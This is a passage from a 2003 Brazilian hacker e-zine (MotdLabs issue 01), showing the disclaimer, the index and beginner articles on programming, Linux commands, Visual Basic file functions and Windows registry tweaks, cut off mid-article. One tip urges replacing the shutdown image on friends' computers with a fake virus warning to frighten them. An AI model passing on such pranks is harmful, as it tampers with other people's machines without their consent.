


                                               dP         dP
                                               88         88
                         88d8b.d8b. .d8888b. d8888P .d888b88
                         88'`88'`88 88'  `88   88   88'  `88
                         88  88  88 88.  .88   88   88.  .88
                         dP  dP  dP `88888P'   dP   `88888P8

                                          oo       dP
                                                   88
                        .d8888b. dP    dP dP .d888b88 .d8888b.
                        88'  `88 88    88 88 88'  `88 88ooood8
                        88.  .88 88.  .88 88 88.  .88 88.  ...
                        `8888P88 `88888P' dP `88888P8 `88888P'
                             .88                    Número 01
                         d8888P





E-zine lançada oficialmente dia 15 de Novembro de 2003.

http://www.motdlabs.org
contato@motdlabs.org
irc.brasnet.org   /join #motd



ATENÇÃO: O  MotdLabs adverte  que não  será responsável  por qualquer tolice que
você venha a fazer.  Estou certo de que  estará consciente que ao  tentar por em
prática quaisquer técnicas descritas no decorrer desta zine, você poderá se  dar
mal. Ela foi criada apenas para propósitos educacionais e cabe a você decidir  o
que  fará com esse poder em suas mãos. Só não venha reclamar que se deu mal  por
ter   feito  algo  que aprendeu  nesta  mesma.  Obrigado pela  a  atenção  e boa
leitura!!! :)





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ Colaboradores ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


IP_FIX......................................................ip_fix@motdlabs.org

Cod3x......................................................codexmail@bol.com.br

SKOFF........................................................skoff@motdlabs.org

hallucination................................................hallz@motdlabs.org

BlackSheep182.........................................blacksheep182@brasnet.org

Nash Leon…................................................nashleon@yahoo.com.br

D4rwin........................................................d4rwin@bol.com.br

Inferninh0..............................................inferninho@motdlabs.org

Caiobat.....................................................caiobat@brasnet.org

Vo5.............................................................vo@motdlabs.org

RedEyes.....................................................redeyes@brasnet.org

Greenhornet............................................greenhornet@motdlabs.org

Jakk_.........................................................jakk_@brasnet.org

HazzarD.....................................................hazzard@brasnet.org

SkyNet45.....................................................skynet@bsdmail.org





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ Índice ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


[ 01 ] Introdução (by IP_FIX)
[ 02 ] Introdução à Programação (by D4rwin)
[ 03 ] Introdução ao Linux (by BlackSheep 182)

Programação
[ 04 ] Programando em Visual Basic (by SKOFF)
[ 05 ] Programando em Badcom (by IP_FIX)
[ 06 ] Programando API em C++ para Windows (by Vo5)

Linux
[ 07 ] Instalando Linux pela 1º vez (by IP_FIX)
[ 08 ] Permições de Arquivos (by Jakk_)
[ 09 ] Programas em Modo Texto (by greenhornet)

Hacking
[ 10 ] Hackeando pelo Google (by BlackSheep182)
[ 11 ] Códigos para Celulares (by Caiobat)
[ 12 ] Introdução ao Hacking Ético (by Nash Leon)
[ 13 ] Básico Shell Code (by Nash Leon)
[ 14 ] Básico Buffer OverFlow (by Nash Leon)

Diversos
[ 15 ] Varreduras e Varreduras (by hallucination)
[ 16 ] Vírus de Macro (by SKOFF)
[ 17 ] Hardware (by RedEyes)
[ 18 ] Básico sobre Redes (by SkyNet45)
[ 19 ] FAQ – Trojans (by D4rwin)
[ 20 ] Telefonia (by Hazzard)
[ 21 ] Segurança Digital (by Inferninh0)
[ 22 ] MOTD no Conisli (by IP_FIX)
[ 23 ] Agradecimentos e Links 


“Don´t learn to hack, hack to learn.” – 2600





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 01 ]=-=[ Introdução ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

   Na data 31/07/03 foi criado o #MOTD. Depois de desentendimentos e perda do no
nosso  ex-canal  virii,  surge  ele  com  pessoas  realmente  competentes,   com
interesses iguais e uma  mesma ética: Livre liberação  de infos e discussão  dos
mesmos de forma consciente.
   Esse é um grupo novo,  com 95% formado por Newbies  que tem sede de infos  de
conteúdo e muita disposição de aprender,  3% são gente de nível bem  acima. Não,
não são hackers, são “Fuçadores”, que possui um nível maior de experiência e que
com a ajuda deles, o grupo está crescendo, não só em número, mas em conhecimento
geral; uma mão  lava a outra  e temos que  nos unir se  quisermos alcançar nosso
objetivo que é obter total conhecimento  e passar-lhe adiante para todos. Os  2%
restantes do  grupo são  gente sem  escrúpulos que  só querem  coisas prontas  e
respostas  completas para  suas perguntas,  nem preciso  falar a  quem estou  me
referindo, mas só falo uma coisa:  “- Lamers, Script Kiddies, Defacers e  afins,
aviso que esta e-zine assim como o grupo #motd, não foram feitos para vocês.  Se
quiserem algum conselho, vão  para http://www.google.com.br  e digitem:  exploit
<nomedafalha>. Afinal, é só isso que sabem fazer!”.
   Se você não se encaixa no último perfil, bem-vindo ao grupo e aproveite  essa
e-zine. Ela é a terceira de nossa geração e a primeira com o nome do novo grupo.
Os assuntos  estão bem  variados e  nos esforçamos  ao máximo  para fornece-lo a
você,  jovem  fuçador, e  espero  que tenhamos  o  ajudado com  algumas  de suas
dúvidas. Lembrando que escremos essa zine para Newbies, mas Newbies ao ponto  ex
-lamer e aos que tem curiosidade do mundo underground.
   Por que escrevemos essa e-zine?  Foi para ajudar aos newbies/fuçadores  recém
chegados a esse submundo que estão tendo dificuldades de conseguir uma base para
conseguirem caminhar sozinhos  e desenvolver coisas  por sí próprio.  Escrevemos
também para aqueles que “querem sair”  da vida de kiddies, defacers e  tals para
seguir uma ética que não degrina a imagem “HACKER” que é mal usada pela mídia  e
é também usada para fins lucrativos, mas que pretendemos mudar isso.
   A respeito das matérias, muita gente  colaborou com o que pôde. Fiquei  feliz
que nas últimas semanas recebi vários  e-mails de gente querendo ajudar o  grupo
com  o mínimo  que pudesse  e outras  já mandando  suas matérias  prontas. Para
aqueles que ficou me devendo matéria e/ou não conseguiram me entregar, digo para
guardarem, melhorarem e  me enviarem pra  já organizar para  próxima edição. Não
tem previsão de lançamento as próximas edições, já que varia muito da  motivação
do  pessoal e  disposição, mas  assim que  tivermos infos  suficientes ela  será
lançada o mais rápido possível.
   Percebam que  os tópicos  são de  assuntos básicos/intermediários  que são de
fácil entendimento para os navegadores de primeira viagem e um prato cheio  para
aqueles que não cansam  de fixar o que  já aprendeu. Pretendemos no  decorrer do
tempo disponibilizarmos  informações de  maior conteúdo,  coisas da  atualidade,
novas  técnicas, etc...Assim  propiciando uma  melhor fonte  de informações  não
repetidas que geralmente encontramos na net afora.
   Antes  que  faça uma  crítica  negativa, lembre-se:  Estamos  escrevendo para
Newbies. Repetindo: Novatos no underground. Se você achou os conteúdos de  baixo
nível, faça uma  das duas coisas  que irei citar:  Pare de ler  e vá fazer outra
coisa;  ou  procure  nos  ajudar  passando  seu  conhecimento.  Conhecimento   e
informação foram feitos para ser passado adiante, não para se elitizar.
   Encerro  aqui dizendo  que o  hacking não  é para  qualquer um.  Se todo  que
quisesse virassem hacker, o mundo estaria infestado. Hacking é um estudo que não
tem fim, limites, barreiras... Ele sempre te leva pra mais longe, cada vez  mais
longe e quando você se  dá conta, não está nem  na metade do fim do  curso; pois
sempre aparecerá  novos degraus  e bifurcações  para subir  essa escada infinita
chamada HACKER...
   Agradeço desde já, o grupo MOTD, que cada vez mais me surpreende com a  garra
firme e a seriedade que estão levando o hacking veradeiro à frente. E é claro ao
pessoal  do  CDM,  Clube  dos  Mercenários,  que  possui  os  mais  variados   e
surpreendentes fuçadores do Brasil. Thanks for all!!


Atenciosamente,

IP_FIX.





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 02 ]=-=[ Introdução à Programação ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Conceitos de Programaçao


O que e um programa?

E um conjunto de instruçoes que  dizem ao computador o que fazer.  Esse conjunto
de  instruçoes, escritas  originalmente pelo  programador, e  chamado de  codigo
-fonte.  Existem varias  linguagens que  vc pode  aprender com  a finalidade  de
escrever programas.
O programa deve ser selecionado pela sua capacidade de realizar a tarefa que  vc
deseja que ela execute. Os  tipos de programas incluem planilhas,  processadores
de txt, programas de editoraçao eletronica, banco de dados e muitos outros.


Como funcionam os programas?

O DOS (Disk Operating System) e  em essencia o cerebro do computador.  O sistema
operacional e  um programa  de computador.  Sem ele,  seu computador nao poderia
funcionar.  Ele  executa  instruçoes  armazenadas  em  um  arquivo  de  programa
executavel.  Essas instruçoes  proporcionam as  funçoes normais  de exibiçao  ao
disco. As intruçoes codificadas no DOS  em nada se parecem com as  instruçoes do
programa original; elas estao escritas em codigo de maquina.


Codigo de Maquina

Para  que  um computador  possa  compreender um  programa,  as instruçoes  desse
programa devem ser traduzidas para a linguagem de maquina, uma serie de  valores
0 e 1 chamados numeros  binarios. Esses numeros binarios representam  instruçoes
no programa. Imagine um computador como um diplomata dos EUA que so fala  arabe.
Para entender discursos em outros idiomas, o diplomata deve usar os serviços  de
um tradutos. Os programadores usam compiladores para traduzir suas instruçoes de
programa em uma forma legivel por  um sistema operacional; essa forma e  chamada
de codigo de maquina


Compiladores e Interpretadores

Um programador tem utilizar um compilador ou um interpretador a fim de  traduzir
o codigo-fonte de alto nivel em codigo de maquina de baixo nivel.
A principal diferença  entre um compilador  e um interpretador  esta na maneira
como executam um programa. Um compilador traduz todo o programa em linguagem  de
maquina  antes  de  iniciar  a   execuçao  das  instruçoes.  Ao  contrario,   um
interpretador le e  executa uma instruçao  de cada vez.  A vantagem da  execuçao
pelo compilador  e que  ela e  muito mais  rapido do  que a  execuçao feita pelo
interpretador.  A  desvantagem de  um  compilador e  que  o programador  precisa
esperar ate que todo o programa seja compilado antes de ser possivel identificar
qualquer erro (nao importando o quanto esse erro seja pequeno).


Interface

O termo interface  se refere ao  aspecto de um  programa para seus  usuarios. Na
maioria dos casos, um programa e projetado com a finalidade de ser utilizado por
outros. Interface e o termo generico usada para designar como o programa e vista
na tela do usuario e a maneira pela qual o usuario se comunica com ele.


Variaveis

Para que se possa entender programaçao, e necessario saber o que sao variaveis e
pra que servem. A variavel e um dos elementos fundamentais em qualquer linguagem
de programaçao. Voce deve se lembrar da algebra elementar, aquela que vc  odeia,
HeHeHeHe, entao, variavel em programaçao e quase a mesma coisa. Os  computadores
utilizam  variaveis de  maneira muito  semelhante ao  modo como  sao usadas  em
algebra. Os dados  armazenados em uma  variavel podem se  modificar. Em algebra,
uma expressao tipica e y = x+2. O valor y se modifica conforme o valor x; x e  y
sao chamados de variaveis porque seus valores podem se alterar.


Tipos de Intruçoes

A medida  que vc  começa a  escrever programas,  passa a  conhecer varios  tipos
diferentes de instuçoes de programaçao. Entre elas temos :

----> Intruçoes de Entrada
----> Intruçoes de Saida
----> Intruçoes Condicionais
----> Intruçoes de Seleçao de caso
----> Intruçoes de Atribuiçao
----> Intruçoes de Chamada a Sub-Rotina
----> Funçao
----> Comentarios
----> Loops

Instruçoes de Entrada

Todas as linguagens de programaçao tem instruçoes de entrada, que sao instruçoes
para levar informaçoes a um programa. Uma lista de compras e um exemplo  simples
de instruçao de entrada. Vc entra com cada item que planeja adquirir no mercado,
e seu programa instrui o computador para imprimir a lista em sua impressora.


Instruçoes de Saida

Nao importa o  quanto o seu  programa seja bom,  ninguem o conhecera  se ele nao
tiver instruçoes de saida. Pode-se afirmar que a finalidade de um programa e sua
saida; um programa deve exibir seus resultados.
Contudo, saida significa mais que algo impresso na tela. Da mesma forma que  as
instruçoes de  entrada servem  para que  o programa  receba dados  de entrada de
diferentes maneiras, as  instruçoes de saida  podem enviar a  saida de mais  uma
maneira. Nos programas que tem entrada mas nao apresentam saida, as  informaçoes
podem ser recolhidas  e manipuladas, mas  o codigo nao  tem qualquer efeito.  Ao
adicionar  uma saida  ao seu  programa, vc  pode ver  o resultado  nas açoes  do
programa; pode enviar essas informaçoes  para a tela, a impressora,  um arquivo,
etc.


Instruçoes Condicionais

"Se nao pode aguentar o calor, fique fora da cozinha."

Essa e uma  instruçao condicional. Seu  nome vem do  fato de que  ela avalia uma
condiçao e entao executa uma açao com base nessa condiçao. Por exemplo,se(vc nao
aguenta o calor), entao fique fora da cozinha.


Instuçoes de Seleçao de Caso ou Select Case

As instruçoes case sao uma forma abreviada de escrever instruçoes  condicionais.
Se vc precisar avaliar uma expressao  longa ou complicada e tiver de  compara-la
com dois ou mais valores condicionais  (dois ou mais testes sobre a  expressao),
vc pode substituir os testes por uma instruçao de selecao de caso.


Instruçoes de Atribuiçao

As  instruçoes  de atribuiçao  designam  valores a  uma  variavel. Um  sinal  de
igualdade ( = ) e a forma  usada com mais frequencia para fazer uma  atribuiçao.
Vc pode atribuir um valor a qualquer variavel do mesmo tipo. As expressoes

A = B e Total = Media

sao instruçoes  de atribuiçao.  Vc pode  atribuir qualquer  variavel a uma outra
variavel do mesmo  tipo, determinar o  valor de uma  expressao e considerar  uma
variavel  igual a  ela, e  tambem definir  uma variavel  como resultado  de uma
funçao.


Intruçoes de Chamada a Sub-Rotina

Quando e necessario  uma açao repetitiva  que utiliza duas  ou mais instruçoes,
esse  grupo de  instruçoes e  um forte  candidato a  se transformar  em uma  sub
-rotina. Uma sub-rotina e, na realidade,  uma seçao separada de codigo, fora  da
sequencia de  execuçao principal  do programa.  Para dizer  ao seu  programa que
execute  a sub-rotina,  e utilizada  a palavra-chave  CALL na  maior parte  das
linguagens.


Funçao

Uma  funçao  e semelhante  a  uma sub-rotina  no  fato de  que  e um  grupo  de
instruçoes relacionadas  que podem  ser executadas  por uma  unica instruçao  de
atribuiçao. Como vc ja sabe, uma sub-rotina retorna ao programa principal quando
termina sua tarefa. Uma funçao faz a  mesma coisa; a unica diferença e que  traz
com ela um valor.


Comentarios
Um comentario e uma anotaçao ou explicaçao do codigo e eh uma parte  importante
da caixa de ferramentas do programdor. Escrever comentarios junto com seu codigo
pode ajudar vc ou qualquer pessoa que leia seu programa a compreender o que  faz
cada seçao do programa. A seguir segue alguns exemplos de comentarios em Pascal,
C e C++:

Pascal
{Este e um  exemplo de comentario  em Pascal, o  comentario pode continuar  por
varias linha ate chegar a chave final.}


C
/* Este e um comentario em C.  Tudo que estiver escrito na sequencia de  barra e
asterisco(/*  e /*)  serao ignorados  pelo programa.  Assim como  no Pascal,  o
comentario so acaba quando chegar a barra e asterisco que segue. */


C++
// Este e  um comentario em  C++, e diferente  das outras linguagens,  para cada
//linha de comentario se utiliza duas barras antes de inciar a frase.


Loops

Um loop repete uma instruçao ou  um conjunto de instuçoes ate que  uma condiçao
que vc  especificou seja  satisfeita. Existem  varias especies  de instruçoes de
loop; com elas, vc pode controlar o fluxo do seu programa.


Tipos de Dados Simples e Operadores Elementares

Os computadores foram criados para processar dados. Os programas de  computador
recebem dados brutos (em geral do teclado ou de um arquivo de disco),  processam
esses dados e produzem informaçoes com significao. Abaixo segue um modelo basico
de um programa de computador:

 _________              ____________________                __________________
|         |            |                    |              |                  |
| Entrada |  ------->  | Processa a Entrada | -----------> |  Produz a Saida  |
|_________|            |____________________|              |__________________|


Um programa tem de ser capaz de  armazenar sua entrada em algum lugar, para  que
possa trabalhar com os dados e processa=los, produzindo alguma saida util para o
usuario. Todos os dados processados por um programa sao armazenados no  programa
como uma variavel ou uma constante.


Variaveis e Constantes

Como  o  nome  jah diz,  variaveis  sao  aquelas que  podem  variar.  Em outras
palavras, as variaveis possuem dados que se modificam com o decorrer do programa
ja as constantes sao valores que nunca se alteram.


Tipos de Dados

Os dados, estejam contidos em variaveis ou constantes, podem ser de  diferentes
tipos. Veja a tabela a seguir:


 ______Nome_______
|                 |
| Inteiros        |
| Inteiros longos |
| Reias           |
|_________________|


Arrays

Depois de estar programando por algum tempo, vc poderia descobrir a necessidade
de  um tipo  especial de  variaveil, denominada  array. Imagine  que vc  tem de
controlar uma centena e valores e pontos em um torneio de cross-crountry, e deve
computar a media entre os pontos, determinar a maior e menor contagem de pontos,
alem de calcular mais algums estatisticas. Aplicando o que vc sabe ate agora, vc
precisaria  de  cem  variaveis  para  armazenar  as  cem  contagens  de  pontos.
Entretanto, vc nao gostaria de ter que criar uma centena de nomes diferentes  de
variaveis para guardar todos os  totais de pontos; isso seria  muito trabalhoso.
Alem disso, se quisesse somar  todos esses valores, seria preciso  uma instruçao
semelhante a esta:

total1 = pontos1 + pontos2 + pontos3 + ........ + pontos100

Depois de vc ter somado os cem valores de pontos, essa instruçao espalharia  por
diversas  linhas  em um  programa.  As linguagens  de  programaçao oferecem  uma
alternativa muito melhor: os arrays. Uma array e uma lista de variaveis que  tem
todas o mesmo nome. Um array contem  mais de uma variavel, cada uma delas  com o
mesmo  noem das  outras, mas  ha um  forma pela  qual vc  e seu  programa podem
distinguir uma variavel da outra. Por  faz-se necessario o uso de um  subscrito.
Subscrito  e  um numero  de  sequencia, que  começa  em 0  ou  1, dependendo  da
linguagem, e que  informa ao computador  quais dentre as  variaveix do array  vc
deseja utilizar. A seguir tem um exemplo de array:

pontos(1) | pontos(2) | pontos(3) | ...... | pontos(100)


OBS.: em algumas linguagens como C, se faz uso de [] ao inves de ().


Ta aew o txt. Se vc chego ate aqui parabens, eh um txt grande. So quero dizeh ki
isso eh tudo que eu sei de programaçao, ou melhor, introduçao a programaçao. Faz
poco tempo que me envolvo com issso. Flw aew.


Texto escrito por : D4rwin

d4rwin@bol.com.br ( irc.brasnet.org - #motd #phreak - nick: D4rwin )





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 03 ]=-=[ Introdução ao Linux ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Índice :

1 - Introdução a linux
2 - Unix\linux
3 - Organização do linux
4 - Comandos do linux
5 - Finalizando


Introdução ao linux :

Todo mundo sabe que  linux é um sistema  operacional muito usado por  empresas ,
sites de administração e inclusive pelos hackers .
O  linux foi  inicialmente programado  por Linus  Torvalds ,  ainda quando  era
estudante  da universidade  de Helsinki  , na  Finlândia Daí  o pingüim  ser um
símbolo tão bom para esse sistema operacional .


Unix\Linux :

O linux recebeu  esse nome com  referencia a seu  criador e, é  claro , por mera
semelhança ao Unix .
Linux  surgiu como  um projeto  pessoal de  Linus Torvalds  , que  iniciou seus
trabalhos inspirando - se no modelo Minix , um pequeno sistema operacional  Unix
desenvolvido por Andy Tannembaum.


Organização do linux.

O linux pode ser dividido operacionalmente em três partes distintas ;

# Kernel
# Shell
# utilitarios e aplicativos

O kernel é o linux propriamente dito . O que realmente chamam de linux é a  suas
distribuições.
O Shell é um programa que interpreta comandos digitados por um usuário e  envia
para o kernel . Além disso o  Shell é uma linguagem de programação completa  com
variáveis , ponteiros e etc.
Os aplicativos e utilitários são os principais programas adicionados ao linux ,
como editores de texto , navegadores , mailers e etc.
O  linux  estruturalmente  organiza seus  arquivos  em  diretórios funcionais  ,
conformo mostro abaixo :

/bin contem os  principais arquivos executáveis  ou links de  binários de outros
diretórios .

/boot contem arquivos de referencia do boot de inicialização do linux.

/dev contem arquivos dispositivos de entrada e saída .

/etc contem  arquivos de  configuração do  sistema ,  de informação  de redes  ,
senhas , logons e etc.

/home contem os diretórios dos usuários cadastrados nos sistema.

/lib contem arquivos de bibliotecas

/mnt contem links de montagem e partições.

/root diretório local do usuário

/sbin contem arquivos de sistemas essenciais

/tmp contem arquivos temporários gerados por certos usuários.

/usr contem arquivos de usuários , diretórios de programas instalados

/var contem arquivos mais importantes da administração e gerencia do sistema.


Comandos dos linux :

Quero mostrar aqui alguns comandos para  o usuário newbie usar o linux  com mais
facilidade :

Adduser cria uma conta para um novo usuário

Cal mostra o calendário

Cat imprime o conteúdo do arquivo na tela

Cd muda de diretório

Chmod muda as permissões de arquivos e diretórios

Clear limpa a tela

Cp copia arquivos .

Date mostra a data e a hora atual

Du mostra o espaço utilizado por um aquivo

Echo mostra uma linha de texto

Find procura arquivos

Finger aponta um usuário e mostra informações sobre ele

Free mostra o espaço livro na memória

ftp comando usado para permitir transferência de arquivos

grep procura por nomes dentro de arquivos

gunzip descompacta arquivos com extensão gz

help mostra uma lista de comandos comuns

hostname informa o nome do host

ls lista os arquivos do diretório

logout finaliza a Shell

mail permite que usuários recebem emails ou não.

Mkdir cria um diretório

Pwd mostra odiretorio onde você se encontra

rlogin permite o login remoto

rmdir deleta diretorios

shutdown termina processos e renicia a maquina

telnet comando que permite comunicar um host com outro (permite acesso remoto).

Vi editor de texto

Who mostra usuários logados no sistema naquela hora


Finalizando :

Bom como viram forneci algumas informações básicas que ajudaram muito o  usuario
newbie a navegar pelo sistema , espero que façam bom proveito e em breve estarei
escrevendo algo novo





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 04 ]=-=[ Programando em Visual Basic ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Poderia dizer que estou escrevendo este artigo porque não tenho nada pra  fazer,
mas nem é isso, estou escrevendo ele porque as funções as quais estou explicando
são pouco encontradas em texto adquiridos na Internet.
Pretendo  no  decorrer  da  E-zine  ir  explicando  mais  sobre  algumas  outras
funções... só que nem sei se vou continuar fazendo isso mesmo porque ando  muito
ocupado.... mas seja o que Deus quiser :)


Comandos:

Kill ----> Função Utilizada em VB para deletar arquivos
Sint: Kill "Arquivo.exe"
Exe: Kill "C:\Algo1\algo.exe

Explicação:
Ele vai Deletar o Arquivo Algo.exe contido na pasta Algo1
OBS.: Caso o programa não encontre  o arquivo irá aparecer uma Mensagem  de erro
que não lembro o nome. :(

--------------

ChDir ----> Função Utilizada para a mudança do diretório principal
Sint: ChDir "Diretório"
Exe: "C:\Algo1\"

Explicação:
Vamos supor que o diretório principal fosse C:\, agora vai ser C:\Algo1\
OBS.: Caso o Diretório não existe  irá aparecer uma mensagem de erro  que também
não lembro o nome. :(

Então preste atenção antes e verifique se o diretório existe...

---------------

ChDrive ----> Função Utilizada Para muda o Driver(unidade)
Sint: ChDrive "Letra do Driver"
Exe: ChDrive "D"

Explicação:
Caso o Driver principal fosse C:\, agora vai ser D:\
OBS.: Verifique se você tem D:\, pra evitar conflitos. :)

---------------

FileCopy ----> Função Utilizada para copiar arquivos
Sint: FileCopy "Diretório\Arquivo" "Diretório"
Exe: FileCopy "C:\autoexec.bat" "C:\windows\"

Explicação:
O programa irá pegar  arquivos e irá copiar  para um diretório (determinado  por
você).
OBS.: Verifique Se o arquivo existe e se o diretório esta correto. :)

---------------

FileLen -----> Função Utilizada para adquiri informações do Arquivo (Tamanho  do
Arquivo)
Sint: FileLen "Diretório\Arquivo.extensão"
Exe: FileLen "C:\windows\telene.exe"

Explicação:
Este comando tem  a principal finalidade  de fornecer o  tamanho do arquivo,  no
caso do exemplo oi o telnet
OBS.: Verifique se o arquivo que você escolheu existe antes de usar esse comando. :)

--------------

FileDateTime -----> Função Utilizada para mostrar a hora que o arquivo foi criado
Sint: FileDataTime "Diretório\arquivo.extensão"
Exe: FileDataTime "C:\autoexec.bat"

Explicação:
Ele irá pegar os dados de quando o autoexec.bat foi criado :)
OBS.: NDA

--------------

MkDir -----> Função Utilizada para criar Pastas(Existe isso em MSDOS).
Sint: MkDir "Diretório"
Exe: MkDir "C:\Algo\"

Explicação:
o Diretório Algo será criado na unidade C:\
OBS: NDA

-------------

RmDir ------> Função Utilizada para Remover Diretórios.
Sint: RmDir "Diretório"
Exe: RmDir "C:\Algo" ou "Algo"

Explicação:
O diretório Algo irá ser removido da unidade C:\
OBS.: Verifique Antes se o diretório Existe. :)

------------

GetAttr  ----->  Função Utilizada  para  indicar os  atributos  de uma  Arquivo;
Seguintes Atributos: Normal, Somente Leitura, Oculto, Sistema e Arquivo.
Sint: Attr "Diretório\Arquivo"
Sint: Attr "C:\autoexec.bat"

Explicação:
Irá mostrar o Atributo ativado no autoexec.bat

--------------

SetAttr -----> Função Utilizada para Mudar ou Adicionar Atributos de um arquivo.
Sint: SetAttr "Diretório\Aruivo", Atributo
Exe: SetAttr "C:\autoexec.bat", 32

Explicação:
O Atributo que será adicionado ao autoxec.bat é "Arquivo"
OBS.: Seguintes Valores para os Atributos: (0 = Normal, 1 = Somente Leitura, 2 =
Oculto, 4 = Sistema e 32 = Arquivo)

--------------

Name -----> Função Utilizada para renomear arquivos
Sint: Dim NomeAntigo, NovoNome
NomeAntigo = "NOMEANTIGO": NovoNome = "NOVOARQUIVO"
Name NomeAntigo As NovoNome

Exe: Dim Arquivoum, Arquivodois
Arquivoum = "C:\MEUDIR\ARQUIVOANTIGO.exe": Arquivodois = "C:\MeuDir\NOVOARQUIVO.exe"
Name Arquivoum As Arquivodois

Explicação:
Primeiramente  nós  declaramos  duas  Variaveis  usando  a  função  Dim(variavel
Arquivoum e Arquivodois) depois definimos o que iria ser cada variavel, no  caso
seria essa linha:

Arquivoum = "C:\MEUDIR\ARQUIVOANTIGO.exe": Arquivodois = "C:\MeuDir\NOVOARQUIVO.exe"

e logo após isso nó usamos a função Name para o renomeanto dos arquivos.

OBS.: NDA

----------------

Escrito por SKOFF ou _LiNe_SKOFF_





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 05 ]=-=[ Programando em Badcom ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Olá galera  Newbie, estou  aqui mais  uma vez  para encher  o saco  de vocês com
informações não  interessantes, mas  que todo  mundo (quase  todo mundo)  sabe e
gosta  de fazer  no bom  e velho  windows, ou  melhor, no  péssimo e  histórico
rwindows.
O que você verá daqui em diante  são truques que muita gente sabe e  você sempre
verá  isso em  algum computador  um dia.  Então chega  de papo  e vamos  ao que
interessa!!! :)


1 - Mudando a tela do "Seu computador já pode ser desligado com segurança."

Isso é fácil de ser feito:

a) Vá no localizar e digite: *.sys;
b) Procure um arquivo chamado "Logos.sys";
c) Dê um duplo clique nele e abra com o velho Paint, "MSPAINT";
d) Ok,  está na  tela a  figura, agora  basta você  modifica-la desenhando  e/ou
escrevendo tudo que quiser e em seguida salve com o mesmo nome (logos.sys) e  no
mesmo diretório  (C:\WINDOWS) e  pronto!!! Desligue  o computador  e se  divirta
fazendo isso no micro de seus amigos.

DICAS: Experimente  abrir também  o "Logow.sys"  e vejá  a figura.  Faça isso no
micro de seus amigos colocando uma mensagem de erro ou de um vírus, eles ficarão
assustados eu garanto... :D.

ATENÇÃO: Como nem  tudo é mil  maravilhas, antes de  você modificar os  arquivo,
faça um backup dele. E outra, NÃO  AUMENTE OS PIXELS DELE!!! Senão a imagem  vai
ficar toda torta  e abstrata quando  você desligar!!! PS:  PIXEL é o  tamanho da
figura. (Que foi? Não é todo mundo que sabe o que é pixel... :D).


2 - Mudando a velocidade do menu de programas do botão iniciar.

Ahhh, esse aqui já  tá manjado mas tudo  bem. Esse é mais  fácil que o de  cima.
Faça o seguinte:

a) Clique em "Iniciar", "Executar" e digite "Regedit";
b) Calma não se assuste, agora clique no sinal de + do "HKEY_CURRENT_USER"  para
ver as sub-pastas;
c) Abra também a sub-pasta "Control Panel" e clique na pasta "Desktop";
d) Ok, tá vendo isso que apareceu? Pois bem, é ali que vamos adicionar uma  nova
seqüência;
e) Clique  com o  botão direito  do mouse  no fundo  e quando  aparacer um  menu
escolha "Novo" e "Valor da seqüência";
f) Nomeie ela para "MenuShowDelay" e o valor dela para "0"(zero);

Pronto! Basta reiniciar o computador ou simplesmente fazer um logoff para surtir
efeito!!!

DICAS:  Isso só  server pra  aumentar a  velocidade do  menu de  programas, mas
experimente aumentar o valor de 0 para digamos... 9999999...!!! :).

ATENÇÃO: O Registro (regedit)  não é brinquedo não.  Um negocinho que você  mude
sem querer  seu micro  poderá ficar  desconfigurado permanetimente  (se você for
leigo é claro...).


3 - Mudando a hora  que fica na bandeja da  barra do menu iniciar para  qualquer
nome que você queira.

Isso daqui é fácil como o de  cima, mas não conheço muita gente que  manje desse
esquema. Então, faça o seguinte:

Abra o bom, velho e perigoso "Regedit";

Vá para "HKEY_CURRENT_USER", "Control Panel" e "International";

Crie um "Valor da seqüência" e nomeie de "sTimeFormat" e seu valor para "IP_FIX";

Reinicie o computador  ou simplesmente faça  o logoff e  veja os resultados  :).
Lembrando que no lugar de "IP_FIX" coloque a mensagem que você quiser é claro...


